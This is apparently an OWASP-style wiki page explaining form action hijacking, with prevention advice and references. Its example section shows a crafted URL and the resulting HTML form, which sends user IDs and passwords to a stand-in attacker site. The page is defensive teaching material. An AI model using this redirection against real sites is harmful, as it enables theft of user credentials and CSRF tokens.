---

layout: col-sidebar
title: Form action hijacking
author: Robert Gilbert (amroot)
contributors: 
permalink: /attacks/Form_action_hijacking
tags: attack, Form action hijacking
auto-migrated: 1

---

## Overview

Form action hijacking allows an attacker to specify the action URL of a
form via a paramter. An attacker can construct a URL that will modify
the action URL of a form to point to the attacker's server. Form content
including CSRF tokens, user entered parameter values, and any other of
the forms content will be delivered to the attacker via the hijacked
action URL.

## How to Test for Form Action Hijacking Vulnerabilities

Check parameter values passed to the form action. See example below.

## How to Prevent Form Action Hijacking Vulnerabilities

Hard-code the form action URL or use a whitelist of allowed URLs.

## Examples

The following URL will generate the a form and set the "url" parameter
as the from action URL. When the form is submitted, the ID and password
will be sent to the attacker's site.

URL:

`https://vulnerablehost.com/?url=https://attackersite.com`

Source:

```html
<form name="form1" id="form1" method="post" action="https://attackersite.com">
    <input type="text" name="id" value="user name">
    <input type="password" name="pass" value="password">
    <input type="submit" name="submit" value="Submit">
</form>
```

## References

- [Common Weakness Enumeration - CWE-20: Improper InputValidation](https://cwe.mitre.org/data/definitions/20.html)
- [PortSwigger: Form action hijacking(reflected)](https://portswigger.net/knowledgebase/issues/details/00501500_formactionhijackingreflected)
- [PortSwigger: Form action hijacking(stored)](https://portswigger.net/knowledgebase/issues/details/00501501_formactionhijackingstored)
